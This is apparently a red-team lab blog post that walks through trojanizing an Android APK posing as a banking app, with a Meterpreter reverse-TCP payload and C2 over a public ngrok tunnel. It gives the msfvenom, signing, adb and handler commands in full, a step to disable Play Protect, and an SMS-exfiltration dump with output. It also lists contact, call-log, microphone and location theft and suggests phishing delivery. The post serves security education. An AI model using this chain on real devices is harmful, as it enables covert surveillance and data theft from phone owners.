---
layout: post
title: "Android Exploitation Lab: Compromising a Pixel 6a with Meterpreter"
date: 2025-10-04 21:41:58 +0200
categories: blogPost
tags: metasploit msfvenom android penetration-testing red-team
---

## Executive Summary

In this Red Team lab exercise, we successfully demonstrated the complete attack chain of compromising an Android device using a malicious APK delivered through a phishing scenario. This educational demonstration was conducted in a controlled environment using Genymotion's Google Pixel 6a emulator running Android 9.

**Target Environment:**
- Device: Google Pixel 6a (Genymotion Emulator)
- OS: Android 9
- Network: Isolated lab environment
- Exposure: ngrok tunnel for remote C2

---

## Lab Architecture

```
┌─────────────────┐         ┌──────────────────┐
│  exegol Linux   │         │  Genymotion      │
│  (Attacker)     │◄───────►│  Pixel 6a        │
│  10.0.3.2       │  NAT    │  Android 9       │
└─────────────────┘         └──────────────────┘
        │
        │ ngrok tunnel
        ▼
┌─────────────────┐
│  0.tcp.eu.      │
│  ngrok.io:13799 │
└─────────────────┘
```

---

## Phase 1: Payload Generation

### Initial Payload Creation (Local Network)

First, we generated a basic Meterpreter reverse TCP payload for local testing:

```bash
msfvenom -p android/meterpreter/reverse_tcp \
  LHOST=10.0.3.2 \
  LPORT=4444 \
  -o mybank.apk
```

**Payload Specifications:**
- Platform: Android
- Payload: `android/meterpreter/reverse_tcp`
- LHOST: 10.0.3.2 (exegol local IP)
- LPORT: 4444
- Output: mybank.apk (unsigned)

---

## Phase 2: APK Signing Process

Android requires all APKs to be signed before installation. We followed the standard signing procedure:

### Step 1: Generate Keystore

```bash
keytool -genkey -v \
  -keystore key.keystore \
  -alias redteam \
  -keyalg RSA \
  -keysize 2048 \
  -validity 1000
```

When prompted, provide the following information:
- Keystore password: [secure password]
- Name, organization, location details
- Confirm all information

### Step 2: Sign the APK

```bash
jarsigner -verbose \
  -sigalg SHA1withRSA \
  -digestalg SHA1 \
  -keystore key.keystore \
  mybank.apk \
  redteam
```

### Step 3: Optimize with Zipalign

```bash
zipalign -v 4 mybank.apk signed_mybank.apk
```

**Purpose of zipalign:** Aligns uncompressed data on 4-byte boundaries, improving runtime performance and reducing memory consumption.

### Step 4: Verify Signature

```bash
jarsigner -verify -verbose -certs signed_mybank.apk
```

Expected output: `jar verified.`

---

## Phase 3: Deployment via ADB

### Transfer to Target Device

```bash
# Verify device connection
adb devices

# Push APK to Downloads folder
adb push signed_mybank.apk /sdcard/Download/
```

**Delivery vector simulation:** In a real-world scenario, this APK would be delivered via:
- Phishing email attachment
- SMS with download link
- Compromised website
- Malicious ad (malvertising)

---

## Phase 4: Command & Control Setup

### Local C2 Configuration

Created an automated resource script for Metasploit:

```bash
nano exploit.rc
```

**exploit.rc content:**
```ruby
use exploit/multi/handler
set payload android/meterpreter/reverse_tcp
set LHOST 0.0.0.0
set LPORT 4444
set ExitOnSession false
exploit -j -z
```

Launch the handler:
```bash
msfconsole -q -r exploit.rc
```

---

## Phase 5: Remote C2 with ngrok

For remote access scenarios, we established a tunnel using ngrok:

### ngrok Configuration

```bash
# Add authentication token
ngrok config add-authtoken redacted '(use your token)'

# Create TCP tunnel
ngrok tcp 4444
```

**ngrok Output:**
```
Forwarding: tcp://0.tcp.eu.ngrok.io:13799 -> localhost:4444
```

### Regenerate Payload for Remote C2

```bash
msfvenom -p android/meterpreter/reverse_tcp \
  LHOST=0.tcp.eu.ngrok.io \
  LPORT=13799 \
  -o mybank2.apk
```

Follow the same signing process and deploy:
```bash
adb push mybank2.apk /sdcard/Download/
```

---

## Phase 6: Exploitation & Post-Exploitation

### Installation on Target

On the Genymotion emulator:
1. Navigate to **Downloads** folder
2. Tap on `signed_mybank.apk`
3. Disable **Play Protect** (Settings → Google → Security → Play Protect)
4. Allow installation from unknown sources
5. Complete installation

### Meterpreter Session Established

```
[*] Sending stage (72424 bytes) to 127.0.0.1
[*] Meterpreter session 2 opened (127.0.0.1:4444 -> 127.0.0.1:33180)
```

### Post-Exploitation Commands Executed

#### 1. SMS Exfiltration
```bash
meterpreter > dump_sms
[*] Fetching 2 sms messages
[*] SMS messages saved to: sms_dump_20251004214305.txt
```

**SMS dump content:**
```bash
cat sms_dump_20251004214305.txt

=====================
[+] SMS messages dump
=====================

Date: 2025-10-04 21:43:05.9907937 +0200
OS: Android 9 - Linux 4.4.157-genymotion-ga887da7 (i686)
Remote IP: 127.0.0.1
Remote Port: 33180

#1
Type	: Outgoing
Date	: 2025-10-04 21:27:06
Address	: 999634954
Status	: NOT_RECEIVED
Message	: seconds test

#2
Type	: Outgoing
Date	: 2025-10-04 21:26:45
Address	: 9999
Status	: NOT_RECEIVED
Message	: hi man whats up
```

#### 2. System Information Gathering
```bash
meterpreter > sysinfo
Computer    : localhost
OS          : Android 9 - Linux 4.14.150-g4a26409ecfe5 (aarch64)
Meterpreter : dalvik/android
```

#### 3. Additional Capabilities Demonstrated
- Root check: `check_root`
- Contact exfiltration: `dump_contacts`
- Call log retrieval: `dump_calllog`
- Microphone recording: `record_mic`
- Geolocation tracking: `geolocate`
- Shell access: `shell`

---


## Conclusion

This lab successfully demonstrated the complete lifecycle of an Android exploitation campaign using Metasploit Framework. The exercise highlighted both the technical capabilities available to attackers and the critical importance of defense-in-depth strategies for mobile security.

**Key Takeaways:**
- ✅ Technical execution is straightforward with proper tools
- ✅ Social engineering remains the critical success factor
- ✅ Multiple detection opportunities exist throughout the attack chain
- ✅ User education is paramount

### Next Steps

In the next article, we'll explore **BadPDF exploitation techniques** for Android devices, demonstrating how malicious PDF files can be weaponized to compromise mobile targets.

---

## Disclaimer

This lab was conducted in a controlled environment for educational purposes only. All techniques demonstrated are intended to improve defensive security posture. Unauthorized access to computer systems is illegal.

**Lab Environment:**
- Isolated network
- Genymotion emulator (no real device)
- No personal data exposed
- Conducted within enterprise Red Team authorization

---

## References

- [Metasploit Unleashed - Android Exploitation](https://www.offensive-security.com/metasploit-unleashed/)
- [Android Security Documentation](https://source.android.com/security)
- [OWASP Mobile Security Testing Guide](https://owasp.org/www-project-mobile-security-testing-guide/)

---

**Author:** bl4ckarch 
**Date:** October 4, 2025  
**Tags:** #RedTeam #AndroidSecurity #Metasploit #PenetrationTesting

---